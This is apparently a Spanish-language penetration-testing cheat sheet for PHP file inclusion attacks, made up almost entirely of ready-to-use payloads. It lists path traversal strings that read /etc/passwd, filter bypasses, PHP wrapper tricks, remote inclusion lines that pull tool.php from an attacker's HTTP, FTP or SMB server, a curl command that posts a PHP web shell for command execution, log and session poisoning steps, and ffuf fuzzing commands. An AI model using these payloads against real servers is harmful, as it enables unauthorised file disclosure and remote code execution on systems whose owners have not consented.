# Cheatsheet ⚙

## Payloads Básicos 👶

| Payload | Descripción |
| --- | --- |
| `/index.php?file=/etc/passwd` | LFI Básico |
| `/index.php?file=../../../../../etc/passwd` | Path Traversal |
| `/index.php?file=/../../../../etc/passwd` | Name Prefix |
| `/index.php?file=/../../../../etc/passwd` | Path Aprobado |

## ByPass Filtros 👦

| Payload | Descripción |
| --- | --- |
| `/index.php?file=....//....//....//etc/passwd` | ByPass str_replace **NO Recursivo** |
| `/index.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` | ByPass UrlEncode |
| `/index.php?file=../../../../etc/passwd%00` | Null Byte (⚠ Válido Para Versiones Antiguas de PHP) |
| `/index.php?file=/etc/././././//hosts` | ByPass Expresiones Regulares |
| `/index.php?file=/et?/././././//hos??` | ByPass Expresiones Regulares |
| `/index.php?file=/etc/passwd/.` | ByPass Expresiones Regulares |

## Wrappers 👨

| Payload | Descripción |
| --- | --- |
| `/index.php?file=php://filter/read=convert.base64-encode/resource=[Archivo]` | Wrapper Base64 |
| `/index.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` | ByPass UrlEncode |
| `?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id` | Zip Wrapper |

## RFI 💻

| Payload | Descripción |
| --- | --- |
| `http://<Dominio>?filename=http://<IP Atacante>/tool.php&cmd=[Comando]` | Petición a un servidor `HTTP` |
| `http://<Dominio>?filename=ftp://<IP Atacante>/tool.php&cmd=[Comando]` | Petición a servidor `FTP` **Anonymous** |
| `http://<Dominio>?filename=ftp://USER@PASSWORD<IP Atacante>/tool.php&cmd=[Comando]` | Petición a servidor `FTP` **Crendenciales** |
| `http://<Dominio>?filename=\\<IP SMB Server>\[Nombre Directorio]\shell.php&cmd=whoami` | Petición a servidor `SMB` |


## RCE 📡

| Payload | Descripción |
| --- | --- |
| `?filename=expect://[Comando]` | RCE usando Wrapper expect |
| `[POST] php://input&cmd=id` | Cuerpo de la petición `<?php system($_GET[’cmd’]); >` |
| `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"` | El comando anterior usando `curl` ❗ |
| `data://text/plain;base64,[Comando en Base64]` | Es imporante `Url Encodear` los caracteres especiales |
| Usando [php_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) 🐱‍👤 | `http://<Dominio>/?file=<Output Programa>&cmd=[Comando]` |


## Log Poisoning 🧪

| Ruta | Payload | Descripción |
| --- | --- | --- |
| `/var/log/apache2/access.log` | `?filename=/var/log/apache2/access.log&cmd=[Comando]` | Ruta Logs de Apache |
| `/var/log/nginx/access.log` | `?filename=/var/log/nginx/access.log&cmd=[Comando]` | Ruta Logs de Nginx |
| 1. Paso `/var/lib/php/sessions/` | `?language=/var/lib/php/sessions/sess_<PHPSESSID>` | PHP Session Poisoning |
| 2. Paso `/var/lib/php/sessions/` | `?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E` | Incluyendo `<?php system($_GET['cmd']); ?>` |
| 3. Paso `/var/lib/php/sessions/` | `/var/lib/php/sessions/sess_<PHPSESSID>&cmd=[Comando]` | Ejecutar comando |



## Automatizando con `ffuf` 🐶

| Comando | Descripción |
| ------- | ----------- |
| `ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ'` | Testear distintos payloads `LFI` |
| `ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php'` | Descubrir rutas del sistema (Linux / Windows) |
| `ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value` | Descubrir parámetros a los cuales aputar Ej. (`?file=`, `?languaje=`, etc.) |